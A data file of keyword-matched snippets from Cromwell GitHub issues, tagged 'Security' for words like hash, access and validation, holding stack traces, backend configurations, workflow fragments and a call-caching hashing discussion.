--278185423cec5467d351ab7518,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4542:6534,access,access,6534,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4542,1,['access'],['access']
Security,dler.ssl.SslHandler$SslTasksRunner.access$2000(SslHandler.java:1609); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler$SslTasksRunner$2.run(SslHandler.java:1770); at io.grpc.netty.shaded.io.netty.util.concurrent.AbstractEventExecutor.runTask(AbstractEventExecutor.java:174); at io.grpc.netty.shaded.io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:167); at io.grpc.netty.shaded.io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470); at io.grpc.netty.shaded.io.netty.channel.epoll.EpollEventLoop.run(EpollEventLoop.java:403); at io.grpc.netty.shaded.io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997); at io.grpc.netty.shaded.io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74); at io.grpc.netty.shaded.io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30); ... 1 common frames omitted; Caused by: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target; at java.base/sun.security.validator.PKIXValidator.doBuild(PKIXValidator.java:388); at java.base/sun.security.validator.PKIXValidator.engineValidate(PKIXValidator.java:271); at java.base/sun.security.validator.Validator.validate(Validator.java:256); at java.base/sun.security.ssl.X509TrustManagerImpl.checkTrusted(X509TrustManagerImpl.java:284); at java.base/sun.security.ssl.X509TrustManagerImpl.checkServerTrusted(X509TrustManagerImpl.java:144); at io.grpc.netty.shaded.io.netty.handler.ssl.ReferenceCountedOpenSslClientContext$ExtendedTrustManagerVerifyCallback.verify(ReferenceCountedOpenSslClientContext.java:234); at io.grpc.netty.shaded.io.netty.handler.ssl.ReferenceCountedOpenSslContext$AbstractCertificateVerifier.verify(ReferenceCountedOpenSslContext.java:779); at io.grpc.netty.shaded.io.netty.internal.tcnative.Cert,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7551:6874,validat,validator,6874,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7551,1,['validat'],['validator']
Security,dling.scala:254); 	at akka.actor.ActorCell.handleFailure(ActorCell.scala:431); 	at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:521); 	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:545); 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:283); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting cpu runtime attribute value greater than 0; Expecting cpuMin runtime attribute value greater than 0; 	at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build(ValidatedRuntimeAttributesBuilder.scala:62); 	at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build$(ValidatedRuntimeAttributesBuilder.scala:56); 	at cromwell.backend.standard.StandardValidatedRuntimeAttributesBuilder$StandardValidatedRuntimeAttributesBuilderImpl.build(StandardValidatedRuntimeAttributesBuilder.scala:20); 	at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes(StandardCachingActorHelper.scala:56); 	at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes$(StandardCachingActorHelper.scala:54); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.validatedRuntimeAttributes$lzycompute(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.validatedRuntimeAttributes(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardCachingActorHelper.startMetadataKeyValues(StandardCachingActorHelper.scala:75); 	at cromwell,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4591:6048,Validat,ValidatedRuntimeAttributesBuilder,6048,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4591,1,['Validat'],['ValidatedRuntimeAttributesBuilder']
Security,doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting cpu runtime attribute value greater than 0; Expecting cpuMin runtime attribute value greater than 0; 	at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build(ValidatedRuntimeAttributesBuilder.scala:62); 	at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build$(ValidatedRuntimeAttributesBuilder.scala:56); 	at cromwell.backend.standard.StandardValidatedRuntimeAttributesBuilder$StandardValidatedRuntimeAttributesBuilderImpl.build(StandardValidatedRuntimeAttributesBuilder.scala:20); 	at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes(StandardCachingActorHelper.scala:56); 	at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes$(StandardCachingActorHelper.scala:54); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.validatedRuntimeAttributes$lzycompute(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.validatedRuntimeAttributes(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardCachingActorHelper.startMetadataKeyValues(StandardCachingActorHelper.scala:75); 	at cromwell.backend.standard.StandardCachingActorHelper.startMetadataKeyValues$(StandardCachingActorHelper.scala:74); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.startMetadataKeyValues$lzycompute(AwsBatchAsyncBackendJobExecutionActor.scala:362); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.startMetadataKeyValues(AwsBatchAsyncBackendJobExecutionActor.scala:362); 	at cromwe,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4591:6445,validat,validatedRuntimeAttributes,6445,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4591,1,['validat'],['validatedRuntimeAttributes']
Security,docker hash error,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7222:7,hash,hash,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7222,1,['hash'],['hash']
Security,docker tags that include sha256 hash don't work with call caching,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4912:32,hash,hash,32,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4912,1,['hash'],['hash']
Security,"docs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're in the right place. -->. If you see I've configured root to be root = ""/fast/gdr/uat/cromwell-executions"". but randomly sometime workflows when I check cromwell api metadata it is pointing to old root which was /g/cromwell/cromwell-executions. . Note I'm running cromwell in server mode with mariadb. I've cleaned and deleted all tables from mariadb. restarted the server as well. Can't find any other config/cache file where it has saved old address. Sometime workflows are fine pointing to new root but sometime not. <!-- Which backend are you running? -->; SLURM on cromwell 36. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->. backend {; # Override the default backend.; default = ""PhoenixSLURM"". # The list of providers.; providers {. PhoenixSLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; runtime-attributes = """"""; String userid; String partitions; String memory_per_node; Int nodes; Int cores; String time; """""". # If an 'exit-code-timeout-seconds' value is specified:; # - When a job has not been alive for longer than this timeout; # - And has still not produced an RC file; # - Then it will be marked as Failed.; # Warning: If set, Cromwell has to run 'check-alive' for every job at regular intervals (unrelated to this timeout). exit-code-timeout-seconds = 600. submit = """"""; chmod 770 -R ${cwd}; sudo change-files.sh ${userid} ${cwd}; phoenix_home_cwd=""/home/${userid}""; phoenix_home_out=""/home/${userid}/stdout""; phoenix_home_err=""/home/${userid}/stderr"". phoenix_script=${script}_phonix; cat ${script} ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4404:1270,PASSWORD,PASSWORDS,1270,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4404,1,['PASSWORD'],['PASSWORDS']
Security,"documentation on the subject could go either way, depending on whether GCPBATCH is part of the other backends or a subset of the pipelines backend (https://cromwell.readthedocs.io/en/latest/cromwell_features/CallCaching/). ; I do not think this is a configuration error, since the same config works with PAPIv2 backend, but if it is, what configuration options would be necessary for configuring gcr.io authentication when using GCPBATCH?. Errors from cromwell logs when task is being callcached:; ```; cromwell_1 | 2024-01-11 11:09:38 pool-9-thread-9 INFO - Manifest request failed for docker manifest V2, falling back to OCI manifest. Image: DockerImageIdentifierWithoutHash(Some(eu.gcr.io),Some(project),image_name,tag); cromwell_1 | cromwell.docker.registryv2.DockerRegistryV2Abstract$Unauthorized: 401 Unauthorized {""errors"":[{""code"":""UNAUTHORIZED"",""message"":""You don't have the needed permissions to perform this operation, and you may have invalid credentials. To authenticate your request, follow the steps in: https://cloud.google.com/container-registry/docs/advanced-authentication""}]}; cromwell_1 | 	at cromwell.docker.registryv2.DockerRegistryV2Abstract.$anonfun$getDigestFromResponse$1(DockerRegistryV2Abstract.scala:321); cromwell_1 | 	at map @ fs2.internal.CompileScope.$anonfun$close$9(CompileScope.scala:246); cromwell_1 | 	at flatMap @ fs2.internal.CompileScope.$anonfun$close$6(CompileScope.scala:245); cromwell_1 | 	at map @ fs2.internal.CompileScope.fs2$internal$CompileScope$$traverseError(CompileScope.scala:222); cromwell_1 | 	at flatMap @ fs2.internal.CompileScope.$anonfun$close$4(CompileScope.scala:244); cromwell_1 | 	at map @ fs2.internal.CompileScope.fs2$internal$CompileScope$$traverseError(CompileScope.scala:222); cromwell_1 | 	at flatMap @ fs2.internal.CompileScope.$anonfun$close$2(CompileScope.scala:242); cromwell_1 | 	at flatMap @ fs2.internal.CompileScope.close(CompileScope.scala:241); cromwell_1 | 	at unsafeRunAsyncAndForget @ cromwell.docker.DockerInfoActor",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7356:1657,authenticat,authenticate,1657,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7356,1,['authenticat'],['authenticate']
Security,"e / negative. Docker runtime attributes with docker hashes do not need any additional processing. All logic in this ticket applies to docker runtime attributes with a ""floating"" tag, which will be referred as ""tag"" in this issue. In all cases, if Cromwell fails to retrieve the docker hash for a task, for any reason, the corresponding call(s) will NOT be eligible for call caching, neither read nor write, regardless of the call caching configuration in effect. **When to get the hashes and what to do with them:**. 1. Cromwell will lookup the hashes corresponding to docker tags, for all docker attributes in all tasks in a workflow and its subworkflows, at Materialization time.; If the runtime attribute value can't be determined, the task in question will be ineligible for call caching. The only case when that should be true is if the attribute is an expression with variables depending on previous tasks being run. 2. If the hash lookup succeed, Cromwell will use that hash to perform any call cache read / write according to the call caching configuration in effect. It will also provide that hash, along with the original floating tag, to the backend when the job gets dispatched. 3. Backends will choose wether to use the hash or the floating tag. They will report to the engine which one they used, so that the engine can send this information to the metadata. **How to get the hash:**. 1. How to get the hash depends on the backend. Which means, at this time, that only workflows for which the backend is known statically at workflow submission time will be supported. 2. If the task is expected to run on the **Local Backend**, Cromwell will attempt to find the hash corresponding to the tag on the machine where it's being run. This first attempt must be done without executing a `pull` to avoid overriding the current local image, if it exits, with the remote repository version.; If the image is not present locally, cromwell will attempt to `pull` the image locally, and use the has",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2048:1055,hash,hash,1055,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2048,2,['hash'],['hash']
Security,"e check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're in the right place. -->. <!-- Which backend are you running? -->. Running on a Local backend with `java -jar $CROMWELL_JAR run -i input.json wf.wdl`. <!-- Paste/Attach your workflow if possible: -->; ```; task hello {; String outfilename; String ? name. command {; echo ""Hello ${default='world' name}"" > ${outfilename}; }; output {; File out = ""${outfilename}""; }; }. workflow test1 {; String name. call hello {; input: outfilename=""${name}.txt"", name = ""${name}""; }; }; ```; <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->. Using default configuration. Output:; ```; [2020-02-11 10:13:03,33] [info] Running with database db.url = jdbc:hsqldb:mem:89c116e0-5bca-4467-aaff-ae492c2ebbaf;shutdown=false;hsqldb.tx=mvcc; [2019-02-11 10:13:14,71] [info] Running migration RenameWorkflowOptionsInMetadata with a read batch size of 100000 and a write batch size of 100000; [2019-02-11 10:13:14,75] [info] [RenameWorkflowOptionsInMetadata] 100%; [2019-02-11 10:13:15,05] [info] Running with database db.url = jdbc:hsqldb:mem:6b5d8035-4932-4680-b912-34885765f705;shutdown=false;hsqldb.tx=mvcc; [2019-02-11 10:13:15,63] [info] Slf4jLogger started; [2019-02-11 10:13:16,02] [info] Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-1ddecb5"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; [2019-02-11 10:13:16,08] [info] Metadata summary refreshing every 2 seconds.; [2019-02-11 10:13",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4626:1114,PASSWORD,PASSWORDS,1114,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4626,1,['PASSWORD'],['PASSWORDS']
Security,"e conditional on failure of the Python section; if [[ ""${debug_dump_flag}"" == ""always"" || ( ""${debug_dump_flag}"" == ""onfail"" && $exit_code -ne 0 ) ]]; then; echo ""Creating debug bundle""; # tar up the output directory; touch debug_bundle.tar.gz; tar cfz debug_bundle.tar.gz --exclude=debug_bundle.tar.gz .; else; touch debug_bundle.tar.gz; fi; /opt/src/algutil/monitor_stop.py. # exit statement must be the last line in the command block; exit $exit_code. }; output {; File out_gvcf = ""${out_gvcf_fn}""; File out_gvcf_index = ""${out_gvcf_fn}.tbi""; File monitor_start=""monitor_start.log""; File monitor_stop=""monitor_stop.log""; File dstat=""dstat.log""; File debug_bundle=""debug_bundle.tar.gz""; } runtime {; docker : ""gcr.io/btl-dockers/btl_gatk:1""; memory: ""${ram_gb}GB""; cpu: ""${cpu_cores}""; disks: ""local-disk ${output_disk_gb} HDD""; bootDiskSizeGb: ""${boot_disk_gb}""; preemptible: ""${preemptible}""; }; parameter_meta {. }. }. application.conf. ```; <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->. system.new-workflow-poll-rate=1; ```; google {. application-name = ""cromwell"". auths = [; {; name = ""application-default""; scheme = ""application_default""; },; {; }; ]; }. engine {; filesystems {; gcs {; }; }; }. call-caching {; enabled = true; invalidate-bad-cache-results = true; }. backend {; default = ""Jes""; providers {; Jes {; actor-factory = ""cromwell.backend.impl.jes.JesBackendLifecycleActorFactory""; config {; // Google project; project = ""gcid-cromwell"". // Base bucket for workflow executions. // Polling for completion backs-off gradually for slower-running jobs.; // This is the maximum polling interval (in seconds):; maximum-polling-interval = 600. genomics {; // A reference to an auth defined in the `google` stanza at the top. This auth is used to create; // Pipelines and manipulate auth JSONs.; // Endpoint for APIs, no reason to change this unless directed by Google.; endpoint-url = ""https://genomics.googleapis.com/"";",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3905:4321,PASSWORD,PASSWORDS,4321,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3905,1,['PASSWORD'],['PASSWORDS']
Security,"e https://cromwell.readthedocs.io/en/stable/backends/Google/ for more details.; # virtual-private-cloud {; # network-label-key = ""network-key""; # auth = ""application-default""; # }. # Global pipeline timeout; # Defaults to 7 days; max 30 days; # pipeline-timeout = 7 days. genomics {; # A reference to an auth defined in the `google` stanza at the top. This auth is used to create; # Pipelines and manipulate auth JSONs.; auth = ""application-default"". // alternative service account to use on the launched compute instance; // NOTE: If combined with service account authorization, both that serivce account and this service account; // must be able to read and write to the 'root' GCS path; compute-service-account = ""default"". # Endpoint for APIs, no reason to change this unless directed by Google.; endpoint-url = ""https://lifesciences.googleapis.com/"". # Currently Cloud Life Sciences API is available only in `us-central1` and `europe-west2` locations.; location = ""us-central1"". # Restrict access to VM metadata. Useful in cases when untrusted containers are running under a service; # account not owned by the submitting user; restrict-metadata-access = false. # Pipelines v2 only: specify the number of times localization and delocalization operations should be attempted; # There is no logic to determine if the error was transient or not, everything is retried upon failure; # Defaults to 3; localization-attempts = 3. # Specifies the minimum file size for `gsutil cp` to use parallel composite uploads during delocalization.; # Parallel composite uploads can result in a significant improvement in delocalization speed for large files; # but may introduce complexities in downloading such files from GCS, please see; # https://cloud.google.com/storage/docs/gsutil/commands/cp#parallel-composite-uploads for more information.; #; # If set to 0 parallel composite uploads are turned off. The default Cromwell configuration turns off; # parallel composite uploads, this sample configuration tu",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6462:3354,access,access,3354,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6462,1,['access'],['access']
Security,"e if using CRAM files\n"",; ""inputBinding"": {; ""prefix"": ""-ref_genome""; },; ""id"": ""#cobalt-1.8.cwl/ref_genome""; },; {; ""type"": ""string"",; ""doc"": ""Name of reference sample\n"",; ""inputBinding"": {; ""prefix"": ""-reference""; },; ""id"": ""#cobalt-1.8.cwl/reference""; },; {; ""type"": ""File"",; ""doc"": ""Path to reference bam file\n"",; ""inputBinding"": {; ""prefix"": ""-reference_bam""; },; ""secondaryFiles"": [; "".bai""; ],; ""id"": ""#cobalt-1.8.cwl/reference_bam""; },; {; ""type"": [; ""null"",; ""int""; ],; ""doc"": ""Number of threads\n"",; ""inputBinding"": {; ""prefix"": ""-threads""; },; ""default"": 4,; ""id"": ""#cobalt-1.8.cwl/threads""; },; {; ""type"": ""string"",; ""doc"": ""Name of tumor sample\n"",; ""inputBinding"": {; ""prefix"": ""-tumor""; },; ""id"": ""#cobalt-1.8.cwl/tumor""; },; {; ""type"": ""File"",; ""doc"": ""Path to tumor bam file\n"",; ""inputBinding"": {; ""prefix"": ""-tumor_bam""; },; ""secondaryFiles"": [; "".bai""; ],; ""id"": ""#cobalt-1.8.cwl/tumor_bam""; },; {; ""type"": ""string"",; ""doc"": ""SAM validation strategy: STRICT, SILENT, LENIENT\n"",; ""inputBinding"": {; ""prefix"": ""-validation_stringency""; },; ""default"": ""STRICT"",; ""id"": ""#cobalt-1.8.cwl/validation_stringency""; }; ],; ""outputs"": [; {; ""type"": ""Directory"",; ""outputBinding"": {; ""glob"": ""$(inputs.output_dir)""; },; ""id"": ""#cobalt-1.8.cwl/outdir""; }; ],; ""id"": ""#cobalt-1.8.cwl""; },; {; ""class"": ""CommandLineTool"",; ""doc"": ""Run the gridss through CWL\n"",; ""requirements"": [; {; ""dockerPull"": ""umccr/gridss-cwl:2.9.4"",; ""class"": ""DockerRequirement""; },; {; ""expressionLib"": [; ""var get_start_memory = function(){ /* Start with 4 Gb to run program */ return 4000; }"",; ""var get_max_memory_from_runtime_memory = function(max_ram){ /* Get Max memory and subtract heap memory */ return max_ram - get_start_memory(); }"",; ""var get_runtime_threads = function(){ return runtime.cores }"",; ""var get_threads_val = function(inputs){ if (inputs.threads === null){ return get_runtime_threads(); } else { return inputs.threads; } }""; ],; ""class"": ""InlineJavascriptRequirement""; },; {; ""coresMin"": ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5826:9301,validat,validation,9301,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5826,1,['validat'],['validation']
Security,"e sample\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""-reference\""\n },\n \""id\"": \""#cobalt-1.8.cwl/reference\""\n },\n {\n \""type\"": \""File\"",\n \""doc\"": \""Path to reference bam file\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""-reference_bam\""\n },\n \""secondaryFiles\"": [\n \"".bai\""\n ],\n \""id\"": \""#cobalt-1.8.cwl/reference_bam\""\n },\n {\n \""type\"": [\n \""null\"",\n \""int\""\n ],\n \""doc\"": \""Number of threads\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""-threads\""\n },\n \""default\"": 4,\n \""id\"": \""#cobalt-1.8.cwl/threads\""\n },\n {\n \""type\"": \""string\"",\n \""doc\"": \""Name of tumor sample\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""-tumor\""\n },\n \""id\"": \""#cobalt-1.8.cwl/tumor\""\n },\n {\n \""type\"": \""File\"",\n \""doc\"": \""Path to tumor bam file\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""-tumor_bam\""\n },\n \""secondaryFiles\"": [\n \"".bai\""\n ],\n \""id\"": \""#cobalt-1.8.cwl/tumor_bam\""\n },\n {\n \""type\"": \""string\"",\n \""doc\"": \""SAM validation strategy: STRICT, SILENT, LENIENT\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""-validation_stringency\""\n },\n \""default\"": \""STRICT\"",\n \""id\"": \""#cobalt-1.8.cwl/validation_stringency\""\n }\n ],\n \""outputs\"": [\n {\n \""type\"": \""Directory\"",\n \""outputBinding\"": {\n \""glob\"": \""$(inputs.output_dir)\""\n },\n \""id\"": \""#cobalt-1.8.cwl/outdir\""\n }\n ],\n \""id\"": \""#cobalt-1.8.cwl\""\n },\n {\n \""class\"": \""CommandLineTool\"",\n \""doc\"": \""Run the gridss through CWL\\n\"",\n \""requirements\"": [\n {\n \""dockerPull\"": \""umccr/gridss-cwl:2.9.4\"",\n \""class\"": \""DockerRequirement\""\n },\n {\n \""expressionLib\"": [\n \""var get_start_memory = function(){ /* Start with 4 Gb to run program */ return 4000; }\"",\n \""var get_max_memory_from_runtime_memory = function(max_ram){ /* Get Max memory and subtract heap memory */ return max_ram - get_start_memory(); }\"",\n \""var get_runtime_threads = function(){ return runtime.cores }\"",\n \""var get_threads_val = function(inputs){ if (inputs.threads === null){ return get_runtime_threads(); } else { ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5826:71167,validat,validation,71167,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5826,1,['validat'],['validation']
Security,"e submit node to calculate all the md5sums. . ## Md5sums; Md5sums are reliable hashes for file integrity, but this was not their intended purpose. Md5sum was intended as a cryptographic hash. A cryptographic hash has the following properties (wikipedia):; 1. it is deterministic, meaning that the same message always results in the same hash; 2. it is quick to compute the hash value for any given message; 3. it is infeasible to generate a message that yields a given hash value; 4. it is infeasible to find two different messages with the same hash value; 5. a small change to a message should change the hash value so extensively that the new hash value appears uncorrelated with the old hash value (avalanche effect). I contest point 2, in that many cryptographic explicitly strife for being slow to calculate in order to negate brute force attempts.; Anyway: for call caching we only need points 1. and 4. All the rest is unnecessary ballast. . ## xxHash; Luckily there is a hashing algorithm that is designed explicitly for content hashing only. It was made to generate reliably different hashes for file content as fast as possible. It's called [xxHash](https://www.xxhash.com). There are Java implementations available and I did [some extensive benchmarking](https://github.com/rhpvorderman/hashtest/) to find out which one was best. The xxh64 (xxhash for 64 bit machines) algorithm was 15 times faster than the java implementation of md5 we currently use in Cromwell. This PR implements the xxhash algorithm for call-caching in Cromwell:. + The default strategy will still be using md5 for backwards compatibility.; + A new `xxh64` strategy is implemented using the 64-bit xxhash algorithm. (I didn't make the xxh32 algorithm available. Is there any Cromwell server still running on 32-bit?) This can be set in the call caching configuration.; + A new `fingerprint` strategy suggested by @illusional, which takes the modtime, size and a xxh64 hash of the first 10 mb of the file to create a ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5450:1828,hash,hashing,1828,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5450,2,['hash'],['hashing']
Security,e.scala:234); 	at scala.collection.immutable.List.foreach(List.scala:381); 	at scala.collection.TraversableLike$class.map(TraversableLike.scala:234); 	at scala.collection.immutable.List.map(List.scala:285); 	at wdl4s.WdlNamespace$.apply(WdlNamespace.scala:207); 	at wdl4s.WdlNamespace$.wdl4s$WdlNamespace$$load(WdlNamespace.scala:177); 	at wdl4s.WdlNamespace$.loadUsingSource(WdlNamespace.scala:173); 	at wdl4s.WdlNamespaceWithWorkflow$.load(WdlNamespace.scala:542); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor$$anonfun$validateNamespaceWithImports$1.apply(MaterializeWorkflowDescriptorActor.scala:363); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor$$anonfun$validateNamespaceWithImports$1.apply(MaterializeWorkflowDescriptorActor.scala:356); 	at lenthall.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:17); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor.validateNamespaceWithImports(MaterializeWorkflowDescriptorActor.scala:356); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor.validateNamespace(MaterializeWorkflowDescriptorActor.scala:372); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor.cromwell$engine$workflow$lifecycle$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor(MaterializeWorkflowDescriptorActor.scala:172); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor$$anonfun$3.applyOrElse(MaterializeWorkflowDescriptorActor.scala:132); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor$$anonfun$3.applyOrElse(MaterializeWorkflowDescriptorActor.scala:130); 	at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:36); 	at akka.actor.FSM$class.processEvent(FSM.scala:663); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor.akka$actor$LoggingFSM$$super$processEvent(MaterializeWorkflowDescriptorActor.scala:117); 	at akka.acto,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1958:2346,validat,validateNamespaceWithImports,2346,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1958,1,['validat'],['validateNamespaceWithImports']
Security,"e4cd010e4b|callCaching:hashes:input:Int runtime_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int runtime_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int numCPUs|C74D97B01EAE257E44AA9D5BADE97BAF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int numCPUs|C74D97B01EAE257E44AA9D5BADE97BAF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int default_attr:max_retries|CFCD208495D565EF66E7DFF9F98764DA|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int default_attr:max_retries|CFCD208495D565EF66E7DFF9F98764DA|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int default_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int default_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Float runtime_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Float runtime_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Float 